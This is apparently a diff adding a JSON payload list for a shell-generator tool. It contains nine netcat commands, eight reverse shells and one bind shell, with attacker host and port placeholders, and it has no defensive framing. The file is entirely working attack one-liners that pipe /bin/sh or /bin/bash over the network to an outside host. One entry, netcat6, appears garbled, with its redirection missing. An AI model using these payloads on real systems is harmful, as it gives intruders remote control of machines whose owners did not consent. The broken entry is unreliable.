@@ -1,0 +1,65 @@
+[
+  {
+    "type": "netcat",
+    "direction": "reverse",
+    "payload": "nc -e /bin/sh {LHOST} {LPORT}",
+    "note": null,
+    "id": "netcat1"
+  },
+  {
+    "type": "netcat",
+    "direction": "reverse",
+    "payload": "nc -e /bin/bash {LHOST} {LPORT}",
+    "note": null,
+    "id": "netcat2"
+  },
+  {
+    "type": "netcat",
+    "direction": "reverse",
+    "payload": "nc -c bash {LHOST} {LPORT}",
+    "note": null,
+    "id": "netcat3"
+  },
+  {
+    "type": "netcat",
+    "direction": "reverse",
+    "payload": "mknod backpipe p && nc {LHOST} {LPORT} 0<backpipe | /bin/bash 1>backpipe",
+    "note": null,
+    "id": "netcat4"
+  },
+  {
+    "type": "netcat",
+    "direction": "reverse",
+    "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
+    "note": null,
+    "id": "netcat5"
+  },
+  {
+    "type": "netcat",
+    "direction": "reverse",
+    "payload": "rm -f /tmp/p; mknod /tmp/p p && nc {LHOST} {LPORT} 0/tmp/p 2>&1",
+    "note": null,
+    "id": "netcat6"
+  },
+  {
+    "type": "netcat",
+    "direction": "reverse",
+    "payload": "rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} > f",
+    "note": null,
+    "id": "netcat7"
+  },
+  {
+    "type": "netcat",
+    "direction": "reverse",
+    "payload": "rm -f x; mknod x p && nc {LHOST} {LPORT} 0<x | /bin/bash 1>x",
+    "note": null,
+    "id": "netcat8"
+  },
+  {
+    "type": "netcat",
+    "direction": "bind",
+    "payload": "nc -lvp {LPORT} -e /bin/sh",
+    "note": null,
+    "id": "netcat9"
+  }
+]
